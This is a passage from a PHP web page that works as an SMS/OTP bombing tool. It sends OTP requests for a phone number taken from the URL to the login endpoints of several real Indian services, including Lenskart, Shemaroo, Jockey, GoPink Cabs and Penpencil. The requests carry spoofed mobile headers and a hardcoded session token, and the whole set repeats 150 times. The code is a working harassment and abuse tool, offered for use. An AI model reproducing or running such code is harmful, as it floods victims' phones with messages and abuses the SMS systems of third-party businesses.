                "data" => json_encode(["country_code" => "+91", "phone" => $mobile]),
                "headers" => [
                    "Host: services.mxgrability.rappi.com",
                    "Content-Type: application/json; charset=utf-8",
                    "Accept-Encoding: gzip",
                    "User-Agent: okhttp/3.9.1"
                ]
            ],
            // Fourth API
            [
                "url" => "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
                "data" => json_encode(["mobile" => $mobile, "organizationId" => "64254d66be2a390018e6d348"]),
                "headers" => [
                    "Host: xylem-api.penpencil.co",
                    "Authorization: Bearer",
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.81 Mobile Safari/537.36",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Accept-Language: en-IN,en-US;q=0.9,en;q=0.8"
                ]
            ],
        
        // Existing API call
            [
                "url" => "https://stage-api-gateway.getzype.com/auth/signinup/code",
                "data" => json_encode(["hashKey" => "", "phoneNumber" => "+91" . $mobile])
            ],
            // New API call 1: gopinkcabs
            [
                "url" => "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
                "data" => http_build_query(["check_mobile_number" => "1", "contact" => $mobile])
            ],
            // New API call 2: Shemaroome
            [
                "url" => "https://www.shemaroome.com/users/resend_otp",
                "data" => http_build_query(["mobile_no" => "+91" . $mobile])
            ],
            // New API call 3: Jockey
            [
                "url" => "https://www.jockey.in/apps/jotp/api/login/resend-otp/+" . $mobile . "?whatsapp=true",
                "data" => "" // No POST data for this GET request
            ],
            [
                "url" => "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
                "data" => json_encode([
                    "captcha" => null,
                    "phoneCode" => "+91",
                    "telephone" => $mobile
                ]),
                "headers" => [
                    "Host" => "api-gateway.juno.lenskart.com",
                    "content-length" => "59",
                    "sec-ch-ua-platform" => "Android",
                    "x-api-client" => "mobilesite",
                    "sec-ch-ua" => "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "sec-ch-ua-mobile" => "?1",
                    "x-session-token" => "7836451c-4b02-4a00-bde1-15f7fb50312a",
                    "x-accept-language" => "en",
                    "x-b3-traceid" => "991736185845136",
                    "x-country-code" => "IN",
                    "user-agent" => "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "content-type" => "application/json",
                    "x-country-code-override" => "IN",
                    "accept" => "*/*",
                    "origin" => "https://www.lenskart.com",
                    "x-requested-with" => "pure.lite.browser",
                    "sec-fetch-site" => "same-site",
                    "sec-fetch-mode" => "cors",
                    "sec-fetch-dest" => "empty",
                    "referer" => "https://www.lenskart.com/",
                    "accept-encoding" => "gzip, deflate, br, zstd",
                    "accept-language" => "en-GB,en-US;q=0.9,en;q=0.8",
                    "priority" => "u=1, i"
                ]
            ],
            // Second API
            [
                "url" => "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
                "data" => json_encode([
                    "captcha" => null,
                    "phoneCode" => "+91",
                    "telephone" => $mobile
                ]),
                "headers" => [
                    "Host" => "api-gateway.juno.lenskart.com",
                    "content-length" => "59",
                    "sec-ch-ua-platform" => "Android",
                    "x-api-client" => "AMAZON_IN",
                    "sec-ch-ua" => "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "sec-ch-ua-mobile" => "?1",
                    "x-session-token" => "7836451c-4b02-4a00-bde1-15f7fb50312a",
                    "x-accept-language" => "en",
                    "x-b3-traceid" => "991736185845136",
                    "x-country-code" => "IN",
                    "user-agent" => "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "content-type" => "application/json",
                    "x-country-code-override" => "IN",
                    "accept" => "*/*",
                    "origin" => "https://www.lenskart.com",
                    "x-requested-with" => "pure.lite.browser",
                    "sec-fetch-site" => "same-site",
                    "sec-fetch-mode" => "cors",
                    "sec-fetch-dest" => "empty",
                    "referer" => "https://www.lenskart.com/",
                    "accept-encoding" => "gzip, deflate, br, zstd",
                    "accept-language" => "en-GB,en-US;q=0.9,en;q=0.8",
                    "priority" => "u=1, i"
                ]
            ]
        ];
       

         // Loop 150 times
        for ($i = 0; $i < 150; $i++) {
            foreach ($apis as $api) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $api['url']);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    "Content-Type: application/json; charset=utf-8",
                    "User-Agent: okhttp/3.9.1"
                ]);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $api['data']);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

                $response = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);

                echo "<p><strong>API:</strong> " . $api['url'] . "</p>";
                echo "<p><strong>Response:</strong> " . $response . "</p>";
                echo "<p><strong>Status Code:</strong> " . $httpcode . "</p><hr>";
            }
        }
    }
    ?>

    <?php
    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        $apis = [
            ["url" => "https://example.com/api1"],
            ["url" => "https://example.com/api2"]
        ];

        // Loop to execute API calls 10 times
        for ($i = 0; $i < 10; $i++) {
            foreach ($apis as $api) {
                $url = $api['url'] . "?mobile=" . $mobile;
                $response = file_get_contents($url);
                echo "<p>API Response ($i): $response</p>";
            }
        }
    }
    ?>

</body>
</html>